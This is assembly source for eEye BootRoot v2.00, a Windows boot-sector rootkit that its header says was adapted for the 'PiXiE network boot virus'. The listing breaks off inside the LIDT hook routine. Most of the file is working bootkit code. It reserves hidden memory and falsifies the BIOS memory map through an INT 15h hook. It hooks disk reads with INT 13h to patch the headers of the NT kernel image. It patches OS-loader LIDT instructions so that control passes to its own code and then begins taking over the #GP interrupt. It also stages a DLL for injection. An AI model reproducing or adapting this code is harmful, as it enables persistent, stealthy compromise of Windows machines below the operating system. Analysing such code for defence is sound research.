;===============================================================
; eEye BootRoot v2.00  [PiXiE]         Last updated: 05/09/2007
;---------------------------------------------------------------
; Demonstration of the capabilities of custom boot sector code
; on a Windows NT-family system.
;
;   eEye BootRoot v1.00: INT 13h hook "virtually patches" OS
;   eEye BootRoot v2.00: OS loader LIDT hook and forced #GP
;
; Adapted for the PiXiE network boot virus.
;
; Derek Soeder - eEye Digital Security - 12/09/2005
;===============================================================


.586p
.model tiny


BOOTORG				EQU 7C00h			; our code is executed by the BIOS at 0000h:7C00h

BOOTROOT_SIZE			EQU (BRCODE16_SIZE + BRCODE32_SIZE)
BOOTROOT_SECTORS		EQU ((BOOTROOT_SIZE + 1FFh) / 200h)
BOOTROOT_KB			EQU ((BOOTROOT_SIZE + 3FFh) / 400h)
BOOTROOT_PAGES			EQU ((BOOTROOT_SIZE + 0FFFh) / 1000h)


WYSE				EQU 0


MEDIA_FLOPPY			EQU 0				; enable only one boot media type
MEDIA_NETBOOT			EQU 1


DLL_RAW_SIZE			EQU 28672


;---------------- NTOSKRNL.EXE exports
NUM_IMPORTS			EQU   23
SIZE_IMPORTS			EQU (NUM_IMPORTS*4)

 ; (InterlockedDecrement)
IoAllocateMdl			EQU (  1 *4)
IoFreeMdl			EQU (  2 *4)
KeAttachProcess			EQU (  3 *4)
KeDetachProcess			EQU (  4 *4)
 ; (MmMapVideoDisplay)
MmMapViewInSystemSpace		EQU (  6 *4)
MmMapViewOfSection		EQU (  7 *4)
MmProbeAndLockPages		EQU (  8 *4)
MmUnlockPages			EQU (  9 *4)
ObDereferenceObject		EQU ( 10 *4)
ObReferenceObjectByHandle	EQU ( 11 *4)
PsCreateSystemThread		EQU ( 12 *4)			; overwritten with PspCreateThread function pointer
PsProcessType			EQU ( 13 *4)
 ; (WRITE_REGISTER_BUFFER_USHORT)
ZwAllocateVirtualMemory		EQU ( 15 *4)
ZwClose				EQU ( 16 *4)
ZwCreateSection			EQU ( 17 *4)
ZwDuplicateObject		EQU ( 18 *4)
ZwMapViewOfSection		EQU ( 19 *4)
ZwOpenSection			EQU ( 20 *4)
ZwQueryInformationProcess	EQU ( 21 *4)
ZwUnmapViewOfSection		EQU ( 22 *4)


PspCreateThread			EQU PsCreateSystemThread


;---------------- Run-time allocated global variables
NUM_GLOBALS			EQU    6
OFS_GLOBALS			EQU (SIZE_IMPORTS)
SIZE_GLOBALS			EQU (NUM_GLOBALS*4)

G_PROCESSNAMEOFS		EQU (  0 *4) + OFS_GLOBALS
G_NEWPROCESSPOOL		EQU (  1 *4) + OFS_GLOBALS
G_DLLSIZE			EQU (  2 *4) + OFS_GLOBALS
G_DLLPHYSICAL			EQU (  3 *4) + OFS_GLOBALS
G_RAWPHYSICAL			EQU (  4 *4) + OFS_GLOBALS
G_WOLLIST			EQU (  5 *4) + OFS_GLOBALS


;---------------- 16-bit real-mode code
BRCODE16 SEGMENT byte use16

ASSUME CS:BRCODE16, DS:BRCODE16, ES:BRCODE16, SS:BRCODE16

@BRCODE16_START EQU $


;---
LIDTHOOKSTUB_START		EQU  (BOOTROOT_KB * 1024)
COPYGDT_START			EQU ((BOOTROOT_KB * 1024) + 0D8h)
SMAP_START			EQU ((BOOTROOT_KB * 1024) + 100h)


;###################################
;##  Boot-Time Installation Code  ##
;###################################

	;
	; Initialization
	;

	cli
	cld

	xor		ax, ax
	mov		ss, ax

	mov		ss:[BOOTORG - 4], esp
	lea		esp, word ptr [BOOTORG - 4]		; ensure that high word of ESP = 0 for @PMode32CopyDLL

	push		ds
	pushad

	;
	; Reserve required KB of conventional memory for our memory-resident code and temporary data
	;

		; first D8h bytes of last 1KB are for OSLOADER LIDT hook stubs;
		; next 28h bytes are for GDT used when copying DLL to extended memory;
		; last 300h bytes are for modified system memory map

	mov		ds, ax

	sub		word ptr ds:[0413h], (BOOTROOT_KB + 1)	; 0040h:0013h - base memory size in KBs
	mov		cx, ds:[0413h]				

	shl		cx, (10-4)				; AX *= 1024 / 10h (convert linear address in KBs to a segment)
	mov		es, cx

	;
	; Initialize reserved memory to zeroes
	;

	mov		cx, ((BOOTROOT_KB + 1) * 1024) / 2
	xor		di, di
	rep stosw

	;
	; Get system memory map
	;

	sub		di, (((BOOTROOT_KB + 1) * 1024) - SMAP_START) - 4 ; ES:DI -> buffer for memory map entry
	lea		esi, [di-4]				; we'll store count of entries at [SI] (set high word of ESI = 0)

	xor		ebx, ebx				; EBX = continuation value (0 for first call)

@smapreadloop:

	lea		eax, ds:[0E820h]			; 16-bit value is zero-extended into EAX (saves a byte over MOV)
	mov		edx, 534D4150h				; 'SMAP'
	pushd		20
	pop		ecx					; ECX = size of buffer (20 bytes)
	int		15h					; INT 15h/AX=E820h: Get system memory map
	jc		short @smapreadloop_done		; if CF set, assume a valid entry was not read, and break loop

	inc		word ptr es:[si]			; increment entry count
	add		di, cx					; advance to next entry position

	test		ebx, ebx				; if EBX == 0, then entry was valid, but was also the last one
	jnz		short @smapreadloop

@smapreadloop_done:

	;
	; Load all sectors of our code into bootstrap and reserved memory
	;

	sti

IF MEDIA_FLOPPY

	push		es


	push		(BOOTORG + 200h) / 10h			; 200h bytes after start of first sector of BootRoot code
	pop		es

		; assume all of the remaining code fits on the first track

	mov		ax, (0200h + (BOOTROOT_SECTORS-1))	; AL = number of sectors
	mov		cx, 0002h				; CH = track; CL = sector and high bits of track
	cwd							; DH = head; DL = drive number (A:)
	xor		bx, bx					; ES:BX -> destination buffer
	int		13h					; INT 13h/AH=02h: Read sector(s) into memory
	jc		short @TransferToMBR_1_c

	pop		es

ENDIF

IF (MEDIA_FLOPPY OR MEDIA_NETBOOT)

		; for network boot, PXE agent has already downloaded all code into a single contiguous block

	mov		cx, BOOTROOT_SIZE
	mov		si, BOOTORG
	xor		di, di
	rep movsb						; copy all 

ENDIF

	;
	; Transfer execution to resident code at top of conventional memory
	;

	push		es
	push		@ExecuteResident
	retf

@ExecuteResident:

	;
	; Load DLL into conventional memory
	;

IF MEDIA_FLOPPY

	mov		ah, 08h
	cwd							; DL = drive number (A:)
	int		13h					; INT 13h/AH=08h: Get drive parameters
@TransferToMBR_1_c:
	jc		@TransferToMBR

	push		cx					; CH = max cylinder; CL = max sector and high bits of max cylinder
	push		dx					; DH = max head; DL = number of drives
	mov		bp, sp

	push		(BOOTORG + (BOOTROOT_SECTORS * 200h)) / 10h ; temporarily load DLL in memory immediately after our code
	pop		es					; (above INT 13h modified ES, but we don't care about its contents)
	xor		bx, bx

	mov		di, (DLL_RAW_SIZE / 200h)		; count of remaining DLL sectors to load
	mov		cx, 0001h + BOOTROOT_SECTORS		; CH = track; CL = sector and high bits of track
	xor		dx, dx					; DH = head; DL = drive number (A:)

@dllsectorloop:

	cmp		cl, [bp+2]
	jbe		short @dllsectorloop_sectorokay
	sub		cl, [bp+2]
	inc		dh
	jmp		short @dllsectorloop

  @dllsectorloop_sectorokay:

	cmp		dh, [bp+1]
	jbe		short @dllsectorloop_headokay
	sub		dh, [bp+1]
	dec		dh
	inc		ch
	jmp		short @dllsectorloop

  @dllsectorloop_headokay:

	mov		ax, 0201h				; AL = number of sectors
	int		13h					; INT 13h/AH=02h: Read sector(s) into memory
	jc		short @TransferToMBR_1_c

	inc		cx
	add		bh, (200h / 100h)			; advance to next sector
	jnz		short @dllsectorloop_samesegment

	mov		ax, es
	add		ah, (1000h / 100h)			; advance to next 64KB segment
	mov		es, ax

  @dllsectorloop_samesegment:

	dec		di
	jnz		short @dllsectorloop

	pop		dx
	pop		cx					; remove stored drive parameter info from stack

ELSEIF MEDIA_NETBOOT

		; DLL already downloaded via TFTP by PXE agent, adjacent to BootRoot code

ENDIF

	;
	; Build GDT for eventual 32-bit protected-mode copy to extended memory
	;

	push		cs
	pop		ds

	mov		ebx, cs
	shl		ebx, 4					; EBX = linear start of reserved conventional memory

	mov		di, COPYGDT_START + 8			; skip over reserved GDT#0000h descriptor
	or		cx, -1

		; GDT#0008h: 16-bit BootRoot code segment

	mov		[di-8+0008h+4], ebx			; [desc+7]    = base bits 31..24
	mov		[di-8+0008h+2], ebx			; [desc+2..4] = base bits 23..0
	mov		[di-8+0008h], cx			; [desc+0..1] = limit bits 15..0
	mov		byte ptr [di-8+0008h+5], 9Ah		; Limit=64KB, P, DPL=0, Code16, RX

		; GDT#0010h: 16-bit flat data segment

	mov		[di-8+0010h], cx			; limit bits 15..0
	mov		word ptr [di-8+0010h+5], 8F92h		; Limit=4GB, P, DPL=0, Data16, RW

		; GDT#0018h: 32-bit BootRoot code segment

	mov		[di-8+0018h+4], ebx			; [desc+7]    = base bits 31..24
	mov		[di-8+0018h+2], ebx			; [desc+2..4] = base bits 23..0
	mov		[di-8+0018h], cx			; [desc+0..1] = limit bits 15..0
	mov		word ptr [di-8+0018h+5], 409Ah		; Limit=64KB, P, DPL=0, Code32, RX

		; GDT#0020h: 64KB data segment for return to real mode

	mov		[di-8+0020h], cx			; limit bits 15..0
	mov		byte ptr [di-8+0020h+5], 92h		; Limit=64KB, P, DPL=0, Data16, RW

	;
	; Adjust system memory map to properly reserve top of conventional memory
	;

	mov		si, SMAP_START
	mov		di, si					; keep a pointer to start of our system memory map copy

	xor		ebp, ebp

	lodsd							; SI now points to start of memory map entries
	xchg		cx, ax					; CX = number of entries
	jcxz		@TransferToMBR_2_cxz

	push		bp					; count of entries that follow last entry eligible for shrinking
								;   (i.e., N - index; 0 if no elibigle entries have been found)
@smapmodloop:

	cmp		dword ptr [si+4], ebp			; base: bits 63..32 == 0
	jnz		short @smapmodloop_next

	cmp		word ptr [si+2], 000Ah			; linear start >= 000A0000h?
	jae		short @smapmodloop_notconventional

	mov		eax, [si]				; base: bits 31..0
	cmp		eax, ebx
	jae		short @smapmodloop_startinrsvd

	add		eax, [si+8]				; length: bits 31..0 (we ignore length bits 63..32)
	sub		eax, ebx
	jbe		short @smapmodloop_next

		; current range ends in reserved memory (EAX = base + length - reserved start)

	sub		[si+8], eax				; reduce length so that (base + length) == reserved start
	jmp		short @smapmodloop_next

  @smapmodloop_startinrsvd:

		; current range begins in reserved memory (EAX = base)

	sub		eax, ebx				; EAX = (base - reserved start)
	mov		[si], ebx				; lower base, and increase length by
	add		[si+8], eax				;   (old base - reserved start)
	jmp		short @smapmodloop_next

  @smapmodloop_notconventional:

	cmp		byte ptr [si+10h], 01h			; type = 01h (available)
	jne		short @smapmodloop_next

	cmp		dword ptr [si+0Ch], ebp			; length: bits 63..32 == 0
	jnz		short @smapmodloop_next

;;;	cmp		byte ptr [si+0Bh], 01h			; look for a >= 16MB (01000000h) chunk
;;;	jb		short @smapmodloop_next
	cmp		word ptr [si+0Ah], 0010h		; look for a > 1MB (technically > 0010FFFFh) chunk
	jbe		short @smapmodloop_next

	pop		ax					; discard previous value and replace with new (N - index)
	push		cx

  @smapmodloop_next:

	add		si, 20
	loop		@smapmodloop

	pop		cx					; CX = 0 if no shrinkable memory map entries were found
@TransferToMBR_2_cxz:
	jcxz		@TransferToMBR				; we couldn't find a suitable entry to shrink; abort everything

		; reduce size of entry targeted for shrinking

	imul		cx, cx, 20				; CX = number of bytes to move (entries remaining * 20)
								;   (SI already points past last entry, since loop terminated)
	sub		si, cx
	sub		word ptr [si+08h+2], (1048576 / 10000h)	; reduce size field to reserve 1MB (two 512KB chunks)

	mov		edi, [si]
	add		edi, [si+8]				; now EDI = (base + reduced size) of current entry

	mov		cs:[BRCODE16_SIZE + (IMM_DLLPHYSICAL - @BRCODE32_START)], edi

	;
	; Copy DLL and BootRoot + raw DLL into reserved physical memory
	;

	mov		si, BOOTORG + (BOOTROOT_SECTORS * 200h)	; linear address of where DLL was loaded (high word of ESI = 0)
	call		@CopyDLL

	mov		si, BOOTORG				; linear address of BootRoot + DLL
	add		edi, 524288				; advance to second 512KB chunk of reserved 1MB
	call		@CopyDLL

	;
	; Install our INT 15h hook
	;

	xor		bx, bx
	mov		ds, bx

	mov		eax, [bx + (15h*4)]
	mov		cs:[INT15HANDLER - @BRCODE16_START], eax ; store previous handler

	mov		word ptr [bx + (15h*4)], @Int15Hook	; point INT 15h vector to our hook handler
	mov		[bx + (15h*4) + 2], cs			; (@CopyDLL above disabled interrupts, so we don't have to here)

	;
	; Load and execute MBR from first hard drive
	;

@TransferToMBR:

	sti

	xor		cx, cx
	mov		es, cx

	mov		ax, 0201h				; AL = number of sectors
	inc		cx					; CH = cylinder; CL = sector and high bits of cylinder
	mov		dx, 0080h				; DH = head; DL = drive number (C:)
	mov		bh, (BOOTORG / 100h)			; ES:BX -> destination buffer
	int		13h					; INT 13h/AH=02h: Read sector(s) into memory

	popad
	pop		ds
	pop		esp

	db		0EAh					; JMP FAR 0000h:7C00h
	dw		BOOTORG, 0000h

;--- All code prior to this point must fit within a single sector! ---


;#################################
;##  Auxiliary 16-bit routines  ##
;#################################

;;
;; @CopyDLL
;;
;; Parameters:	EBX = linear address of BootRoot code in reserved conventional memory
;;		ESI = pointer to start of source memory (DLL or BootRoot + DLL)
;;		EDI = pointer to start of reserved extended memory to receive copy of DLL
;;
;; Returns:	none
;;		(DS, ES destroyed, IF cleared)
;;

@CopyDLL:

	pushad

	;
	; Enable A20 address line
	;

		; use BIOS functionality to enable A20, if available
		;
		; So true: http://www.win.tue.nl/~aeb/linux/kbd/A20.html

	mov		ax, 2402h
	int		15h					; INT 15h/AX=2402h: Get A20 Gate Status (later PS/2s)
	cli							; BIOS may re-enable interrupts, but it's better if they're off
	jc		short @CopyDLL_manuala20enable
	test		ax, 0FFFEh				; proper return should have AX = 0 or 1 only
	jnz		short @CopyDLL_manuala20enable

	push		ax					; save previous A20 line state (0 = disabled, 1 = enabled)

	dec		ax
	jz		short @CopyDLL_a20enabled		; A20 already enabled if AX was 1

	mov		ax, 2401h
	int		15h					; INT 15h/AX=2401h: Enable A20 Gate (later PS/2s)
	cli
	jnc		short @CopyDLL_a20enabled

	pop		ax

@CopyDLL_manuala20enable:

		; do manual chip manipulations to enable A20

  @CopyDLL_manuala20enable_emptyloop:				; empty keyboard output buffer (meaning data from 8042 to us)

	in		al, 64h					; keyboard controller status
	jmp		short $+2				; waste some time
	test		al, 03h					; bit 1: 8042 input buffer full (we can't write data),
								; bit 0: 8042 output buffer full (data waiting for us)
	jnz		short @CopyDLL_manuala20enable_emptyloop

	call		Wait8042Writable
	mov		al, 0D0h				; D0h: read output port (bit 1 of which is A20 status)
	out		64h, al
	jmp		short $+2

	xor		cx, cx

  @CopyDLL_manuala20enable_datareadyloop:

	in		al, 64h					; some controllers apparently don't set the data-ready bit,
	jmp		short $+2				;   while others require a relatively long delay before
	test		al, 01h					;   responding with the "keyboard controller output port" byte
	loopz		@CopyDLL_manuala20enable_datareadyloop

	in		al, 60h
	and		ax, 02h					; output port bit 1: A20 line status (0 = disabled, 1 = enabled)

	push		ax
	jnz		short @CopyDLL_a20enabled

	call		Wait8042Writable

	mov		al, 0D1h				; D1h: write output port
	out		64h, al
	call		Wait8042Writable
	mov		al, 0DFh				; bit 6: no input (clear it because we do have input for 8042),
	out		60h, al					; bit 1: A20 line status (set to enable),
	call		Wait8042Writable			; bit 0: system reset (will reboot if pulsed low, so keep it set)
	mov		al, 0FFh
	out		64h, al					; basically a no-op (doesn't pulse any output port bits low)
	call		Wait8042Writable

@CopyDLL_a20enabled:

	;
	; Enter 16-bit protected mode
	;

	mov		bp, sp
	sub		sp, 6					; variable to receive previous GDTR

	add		ebx, COPYGDT_START
	push		ebx					; GDTR.Base
	push		0027h					; GDTR.Limit

	mov		word ptr cs:[PMODECOPYDLL_CS - @BRCODE16_START], cs

	sgdt		fword ptr [bp-6]
	lgdt		fword ptr [bp-0Ch]

	mov		dx, ss					; save SS in DX while in protected mode

	push		0020h
	pop		ss					; SS = 64KB data segment based at 0 (same as current SS)

	mov		eax, cr0
	or		al, 1					; CR0.PE = 1: enable protected mode
	mov		cr0, eax				; EAX retains all other bits of CR0 unmodified, for restoring later

	db		0EAh					; JMP FAR 0008h:@PMode16CopyDLL (16-bit protected mode)
	dw		@PMode16CopyDLL, 0008h

@PMode16CopyDLL:

	;
	; Jump to 32-bit protected mode code to copy DLL to linear address EDI
	;

	mov		cx, ss
	mov		ss, cx					; reload SS to fix base in shadow descriptor

	push		0010h
	pop		ds					; DS = flat 4GB data segment for copying DLL from
								;      its linear address within conventional memory
	push		ds
	pop		es					; ES = flat 4GB data segment for copying DLL to extended memory

	db		0EAh					; JMP FAR 0018h:@PMode32CopyDLL (32-bit protected mode)
	dw		(@PMode32CopyDLL - @BRCODE32_START + BRCODE16_SIZE), 0018h

@PMode16CopyDLL_done:

	;
	; Switch back to real mode and restore processor state
	;

	push		ss
	pop		ds					; load DS and ES with 64KB segment to repair shadow descriptors

	push		ss
	pop		es

	and		al, NOT 1				; CR0.PE = 0: return to real mode
	mov		cr0, eax

	db		0EAh					; JMP FAR CS:@CopyDLL_done
	dw		@CopyDLL_done
PMODECOPYDLL_CS EQU $
	dw		?

@CopyDLL_done:

	mov		ss, dx
	lgdt		fword ptr [bp-6]
	mov		sp, bp

	;
	; Restore A20 line to its previous setting
	;

	pop		ax
	test		ax, ax
	jnz		short @CopyDLL_ret			; leave A20 enabled if it wasn't disabled before

	mov		ax, 2400h
	int		15h					; INT 15h/AX=2400h: Disable A20 Gate (later PS/2s)
	cli
	jnc		short @CopyDLL_ret

	call		Wait8042Writable

	mov		al, 0D1h				; D1h: write output port
	out		64h, al
	call		Wait8042Writable
	mov		al, 0DDh				; bit 1: A20 line status (clear to disable)
	out		60h, al
	call		Wait8042Writable

@CopyDLL_ret:

	popad
	ret


;;
;; Wait8042Writable
;;
;; Parameters:	none
;;
;; Returns:	none (AL destroyed)
;;

Wait8042Writable proc

@Wait8042Writable_loop:
	jmp		short $+2				; waste some time
	in		al, 64h					; keyboard controller status
	test		al, 02h					; bit 1: 8042 input buffer full; wait until it clears to write
	jnz		short @Wait8042Writable_loop
	ret

Wait8042Writable endp


;##################################
;##  INT 13h Hook Real-Mode ISR  ##
;##################################

@Int13Hook:

	pushf
	cmp		ah, 42h					; IBM/MS INT 13 Extensions - EXTENDED READ
	je		short @Int13Hook_ReadRequest

	cmp		ah, 02h					; DISK - READ SECTOR(S) INTO MEMORY
	je		short @Int13Hook_ReadRequest
	popf

	db		0EAh					; JMP FAR INT13HANDLER
INT13HANDLER EQU $
	dd		?

@Int13Hook_ReadRequest:

	mov		byte ptr cs:[INT13LASTFUNCTION], ah	; assumes there's no reentrant / "preemptive" INT 13h calling

	;
	; Invoke original handler to perform read operation
	;

	popf
	pushf							; push Flags because we're simulating an INT
	call		dword ptr cs:[INT13HANDLER]		; call original handler
	jc		@Int13Hook_ret				; abort immediately if read failed

	pushf
	cli
	cld
	push		ds
	push		es
	pushad

	;
	; Adjust registers to internally emulate an AH=02h read if AH=42h was used
	;

	mov		ah, 00h
INT13LASTFUNCTION EQU $-1
	cmp		ah, 42h
	jne		short @Int13Hook_notextread

	lodsw
	lodsw							; +02h  WORD    number of blocks to transfer
	les		bx, [si]				; +04h  DWORD   transfer buffer

@Int13Hook_notextread:

	push		es					; buffer is at ES:BX for AH=02h
	pop		ds

	;
	; Adjust image size and checksum in sector containing MZ/PE headers
	;

	test		al, al					; number of sectors read
	jle		short @Int13Hook_done

	xor		esi, esi

@Int13Hook_sectorloop:

	cmp		word ptr [bx], 5A4Dh			; IMAGE_DOS_HEADER.e_magic == IMAGE_DOS_SIGNATURE ("MZ")
	jne		short @Int13Hook_sectorloop_next

	mov		di, [bx+3Ch]				; (short)IMAGE_DOS_HEADER.e_lfanew
	cmp		di, 40h					; offset to PE header must be >= sizeof(IMAGE_DOS_HEADER)
	jb		short @Int13Hook_sectorloop_next
	cmp		di, (200h - 5Ch)			; make sure we have IMAGE_OPTIONAL_HEADER.SizeOfImage and CheckSum
	ja		short @Int13Hook_sectorloop_next
	cmp		word ptr [bx+di], 4550h			; (short)IMAGE_NT_HEADERS.Signature == IMAGE_NT_SIGNATURE ("PE")
	jne		short @Int13Hook_sectorloop_next
	test		byte ptr [bx+di+17h], 20h		; IMAGE_NT_HEADER.FileHeader.Characteristics & IMAGE_FILE_DLL
	jnz		short @Int13Hook_sectorloop_next	;   (NTOSKRNL.EXE may not be the first non-DLL image we
								;    encounter (e.g., INTELPPM.SYS), but hopefully it
								;    will be the first one with an export directory)
	cmp		dword ptr [bx+di+78h], esi		; IMAGE_NT_HEADER.OptionalHeader.DataDirectory
	jz		short @Int13Hook_sectorloop_next	;   [IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress non-null

		; adjust CheckSum and SizeOfImage

	mov		edx, [bx+di+58h]			; IMAGE_NT_HEADERS.OptionalHeader.CheckSum
	sub		edx, [bx+di+50h]			; IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage
	add		dh, ((BOOTROOT_PAGES * 1000h) / 100h)
	adc		dx, si

	cmp		byte ptr [bx+di+40h], 4			; IMAGE_NT_HEADERS.OptionalHeader.MajorOperatingSystemVersion
	jne		short @Int13Hook_sectorloop_notnt4

		; nullify relocations record on NT 4.0, since it will truncate NTOSKRNL image at that point
		; Note: This will probably prevent NTOSKRNL from loading if the /3GB switch is used. (not tested)

	cmp		byte ptr [bx+di+34h+3], 80h		; assume that only NTOSKRNL will have an image base of 80xxxxxxh;
	jne		short @Int13Hook_sectorloop_notnt4	;   this is to keep us from wiping out a driver's relocations

	sub		dx, [bx+di+0A0h]			; compensate checksum for value we're about to set to 0
	sbb		dx, si
	sub		dx, [bx+di+0A2h]
	sbb		dx, si

	and		dword ptr [bx+di+0A0h], esi		; IMAGE_NT_HEADERS.OptionalHeader.DataDirectory
								;   [IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress
  @Int13Hook_sectorloop_notnt4:

	add		edx, [bx+di+50h]			; TO-DO: should we add modified size, instead of adjusting by
								;        BOOTROOT_SIZE above and then adding original size here?
	mov		[bx+di+58h], edx			; checksum is a 16-bit checksum + 32-bit virtual size of image

	add		dword ptr [bx+di+50h], (BOOTROOT_PAGES * 1000h) ; increase IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage

	jmp		short @Int13Hook_done

  @Int13Hook_sectorloop_next:

	add		bh, 02h					; advance by sector size (200h)
	dec		al
	jnz		short @Int13Hook_sectorloop

@Int13Hook_done:

	popad
	pop		es
	pop		ds
	popf

@Int13Hook_ret:

	retf 2							; discard saved Flags from original INT (pass back CF, etc.)


;##################################
;##  INT 15h Hook Real-Mode ISR  ##
;##################################

@Int15Hook:

	pushf
	cmp		word ptr cs:[SMAP_START], 0
	jz		short @Int15Hook_disabled
	cmp		ax, 0E820h				; BIOS - GET SYSTEM MEMORY MAP
	je		short @Int15Hook_SMap
@Int15Hook_disabled:
	popf

	db		0EAh					; JMP FAR INT15HANDLER
INT15HANDLER EQU $
	dd		?

@Int15Hook_SMap:

	popf							; we're going to update CF, so don't bother saving Flags

	push		ds
	pushad
	cld

	jmp		short @Int15Hook_lidtscan		; 'lidtscan' must preserve EBX, DI, and ES, because we need them
@Int15Hook_ret_from_lidtscan:					;   to determine which entry to return and where to store it

	;
	; Return system memory map entries from our modified copy
	;

	push		cs
	pop		ds
	mov		si, SMAP_START
	lodsd
	cmp		ebx, eax
	jae		short @Int15Hook_SMap_fail

	imul		cx, bx, 20
	add		si, cx					; SI += 4 + (entry index * 20)

	mov		cx, 20 / 2
	rep movsw

	inc		bx
	cmp		bx, ax

	popad

	jne		short @Int15Hook_SMap_moreentries
	or		ebx, -1					; indicate to caller that this is last entry (-1 will become 0)
@Int15Hook_SMap_moreentries:
	inc		ebx

	mov		eax, edx
	xor		ecx, ecx				; (CF cleared)
	mov		cl, 20
@Int15Hook_SMap_retf:
	pop		ds
	retf 2							; discard saved Flags from original INT (pass back CF, etc.)

  @Int15Hook_SMap_fail:

	stc
	popad							; we don't bother to return an error code in AH
	jmp		short @Int15Hook_SMap_retf


;---
@Int15Hook_lidtloop_done:

	pop		si					; now SI points to checksum field
	test		si, si
	jz		short @Int15Hook_lidtscan_pop_ret

	push		2000h
	pop		ds

	mov		[si], di				; replace low word of checksum with adjusted value
	mov		eax, [si-58h+50h]			; IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage
	add		[si], eax				; IMAGE_NT_HEADERS.OptionalHeader.CheckSum

@Int15Hook_lidtscan_pop_ret:
	popad
	jmp		short @Int15Hook_ret_from_lidtscan

;---
@Int15Hook_lidtscan:

		; modify "JMP SHORT @Int15Hook_lidtscan" 'rel8' to make this code one-time-only

	mov		byte ptr cs:[@Int15Hook_ret_from_lidtscan - @BRCODE16_START - 1], 0

	pushad

	;
	; Install our INT 13h hook
	; (do this here, after NTLDR is executing, so that our PE EXE detection code doesn't trigger on OSLOADER.EXE)
	;

	xor		si, si
	mov		ds, si

	pushf
	cli

	mov		eax, [si + (13h*4)]
	mov		cs:[INT13HANDLER - @BRCODE16_START], eax ; store previous handler

	mov		word ptr [si + (13h*4)], @Int13Hook	; point INT 13h vector to our hook handler
	mov		[si + (13h*4) + 2], cs

	popf

	;
	; Scan NTLDR for OSLOADER MZ/PE headers
	;

	push		2000h
	pop		ds					; starting segment of NTLDR = 2000h

	xor		di, di					; we'll scan 16 bytes at a time over 64KB

@Int15Hook_mzpeloop:

	cmp		word ptr [di], 5A4Dh			; IMAGE_DOS_HEADER.e_magic == "MZ"
	jne		short @Int15Hook_mzpeloop_next

	mov		bx, word ptr [di+3Ch]
	cmp		bh, (200h / 100h)
	jae		short @Int15Hook_mzpeloop_next

	cmp		word ptr [di+bx], 4550h			; (short)IMAGE_NT_HEADERS.Signature == "PE"
	jne		short @Int15Hook_mzpeloop_next

	lea		di, [di+bx+58h]				; &(IMAGE_NT_HEADERS.OptionalHeader.CheckSum)
	mov		eax, [di-58h+50h]			; IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage
	sub		[di], eax				; check sum -= image size (we'll add it back later)
	mov		ax, [di]
	jmp		short @Int15Hook_mzpeloop_done

  @Int15Hook_mzpeloop_next:

	add		di, 10h
	jnz		@Int15Hook_mzpeloop

@Int15Hook_mzpeloop_done:					; now DI -> checksum if PE header could be located, else DI = 0

	push		di					; preserve pointer to checksum within segment 2000h
	xchg		di, ax					; use DI for 16-bit checksum

	;
	; Scan OSLOADER for "LIDT [ofs32]" instructions (MempCopyGdt)
	;

	lea		ebx, ds:[LIDTHOOKSTUB_START]

@Int15Hook_lidtloop:

	xor		cx, cx

	mov		ax, ds
	cmp		ax, 2000h + (320*1024 / 16)		; assume NTLDR + OSLOADER <= 320KB
	jae		short @Int15Hook_lidtloop_done

		; search for opcode + postbyte

	mov		edx, 001D010Fh				; 0F 01 1D xx xx xx xx    LIDT FWORD PTR [ofs32]

  @Int15Hook_lidtloop_instrloop:

	call		ReadByteLinear
	cmp		al, dl
	jne		short @Int15Hook_lidtloop_rewind
	inc		cx					; CX = number of instruction bytes matched, so we can go back if
								;   we had a partial match (don't miss e.g. ... 0F 0F 01 1D ...)
	shr		edx, 8
	jnz		short @Int15Hook_lidtloop_instrloop

		; check offset of IDTR data to load

	inc		cx					; now CX = 4 (number of bytes in 'ofs32' component)

  @Int15Hook_lidtloop_ofsloop:

	call		ReadByteLinear
	mov		dl, al
	ror		edx, 8
	loop		short @Int15Hook_lidtloop_ofsloop

	test		edx, 0FF800003h
	jnz		short @Int15Hook_lidtloop

		; factor LIDT instruction code out of checksum

	push		si					; preserve SI because AND is irreversible

	sub		si, 7
	and		si, NOT 1				; force word alignment
	mov		cl, 4

  @Int15Hook_lidtloop_subchecksumloop:

	lodsw
	sub		di, ax
	sbb		di, 0
	loop		@Int15Hook_lidtloop_subchecksumloop

	pop		si

		; hook LIDT instruction

	mov		eax, cs
	shl		eax, 4
	lea		ebp, [eax+ebx]				; calculate hook stub linear address

	add		eax, (@LIDTHook - @BRCODE32_START + BRCODE16_SIZE)
								; create "hook stub" of the form:
	mov		cs:[bx], eax				;  +00h  DWORD   @LIDTHook linear
	mov		cs:[bx+4], edx				;  +04h  DWORD   IDTR data offset
	add		bx, 8

	push		si
	sub		si, 7

	mov		dword ptr [si], 15FF90h			; 90h:              NOP
	mov		[si+3], ebp				; FFh/15h/xxxxxxxx: CALL DWORD PTR [ofs32]

		; include hook code in checksum

	and		si, NOT 1
	mov		cl, 4

  @Int15Hook_lidtloop_addchecksumloop:

	lodsw
	add		di, ax
	adc		di, 0
	loop		@Int15Hook_lidtloop_addchecksumloop	; CX = 0 after loop completes, so SUB is ineffective

	pop		si

  @Int15Hook_lidtloop_rewind:

	sub		si, cx
	jmp		@Int15Hook_lidtloop


ReadByteLinear:

	lodsb
	cmp		si, 0020h
	jne		short @ReadByteLinear_ret

		; keep SI in the range 0010h..001Fh so we can always "reach back" up to 16 bytes

	mov		bp, ds
	inc		bp					; advance to next 16-byte segment
	mov		ds, bp
	shr		si, 1					; SI = 0010h

@ReadByteLinear_ret:

	ret


@BRCODE16_END EQU $

BRCODE16_SIZE EQU (@BRCODE16_END - @BRCODE16_START)

BRCODE16 ENDS


;---------------- 32-bit protected mode code
BRCODE32 SEGMENT byte use32

ASSUME CS:BRCODE32, DS:nothing, ES:nothing, SS:nothing

@BRCODE32_START EQU $


;#########################################################
;##  OSLOADER "LIDT [ofs32]" Instruction Hook Function  ##
;#########################################################

@LIDTHook:

	pushad

	;
	; Perform LIDT
	;

	mov		eax, [esp+20h]				; ret addr -> "CALL [ofs32]" + 6
	mov		eax, [eax-4]				; get 'ofs32' from CALL instruction
	mov		ebx, [eax+4]				; get offset of IDTR data from hook stub
	lidt		fword ptr [ebx]

	;
	; Modify INT 0Dh (#GP) descriptor in IDT
	;

	mov		ebx, [ebx+2]				; base of IDT
	mov		eax, [eax]				; get @LIDTHook from hook stub
	add		eax, (@Int0DHook - @LIDTHook)		; now EAX = @Int0DHook linear

